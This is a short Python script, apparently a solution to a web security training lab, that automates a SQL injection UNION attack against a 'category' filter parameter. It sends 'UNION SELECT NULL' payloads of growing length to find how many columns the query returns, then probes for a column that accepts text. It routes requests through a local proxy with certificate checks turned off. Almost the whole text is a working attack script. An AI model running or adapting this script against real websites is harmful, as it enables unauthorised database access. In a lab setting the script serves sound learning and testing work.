# Lab: SQL injection UNION attack, determining the number of columns returned by the query

import requests
import re
import sys
from requests.utils import requote_uri
import argparse
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def sql_injection():
    url = target_url + "/filter?category="

    payloads = []
    for i in range(2,10):
        payload = "Pets'+UNION+SELECT+NULL"
        for j in range(1,i):
            payload += ",NULL"
        payload += "--"
        payloads.append(payload)

    
    final_payload = ""
    for payload in payloads:
        malicious_url = requote_uri(url + payload)
        out = r.get(malicious_url, verify = False, proxies = proxies)
        if out.status_code == 200:
            print("[+] Exploited ")
            print("Payload: ", payload)
            print("Exploit URL: ", malicious_url)
            final_payload = payload
            break

    payloads = []
    for i in range(1, final_payload.count("NULL")+1):
        payload = "Pets'+UNION+SELECT+"
        for j in range(1,i):
            payload += "NULL,"
        payload += "'a'"
        for j in range(i, final_payload.count("NULL")):
            payload += ",NULL"
        payload += "--"
        payloads.append(payload)

    for payload in payloads:
        malicious_url = requote_uri(url + payload)
        out = r.get(malicious_url, verify = False, proxies = proxies)
        if out.status_code == 200:
            print("[+] Exploited ")
            print("Payload: ", payload)
            print("Exploit URL: ", malicious_url)
            final_payload = payload
            break


if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', type=str, required=True)
    args = parser.parse_args()

    r = requests.Session()
    target_url = args.host
    proxies = {
        'https':'http://127.0.0.1:8080',
        'http':'http://127.0.0.1:8080'
    }
    
    sql_injection()